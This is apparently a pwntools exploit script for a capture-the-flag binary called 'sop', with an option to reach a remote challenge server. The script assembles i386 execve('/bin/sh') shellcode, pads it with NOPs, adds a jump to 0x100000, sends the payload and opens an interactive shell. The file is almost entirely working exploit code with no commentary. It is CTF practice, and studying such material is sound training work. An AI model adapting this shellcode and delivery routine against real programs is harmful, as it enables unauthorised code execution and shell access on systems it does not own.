#!/usr/bin/env python3
from pwn import *

bin_name = "./sop"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')
context.arch = 'i386'
def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("sop.challs.cyberchallenge.it", 9247)
    else:
        return process(elf.path)

def main():
    r = conn()
    shellcode = asm('''
                push 0xb
                pop eax
                push 0x0068732f
                push 0x6e69622f
                mov ebx,esp
                push 0
                pop ecx
                push 0
                pop edx
                int 0x80
                    ''')
    shellcode = shellcode.ljust(0x100,b'\x90')
    shellcode += asm('''
                    mov eax, 0x100000
                    jmp eax
                    ''')
    r.recv()
    r.send(shellcode)


    r.interactive()

if __name__ == "__main__":
    main()
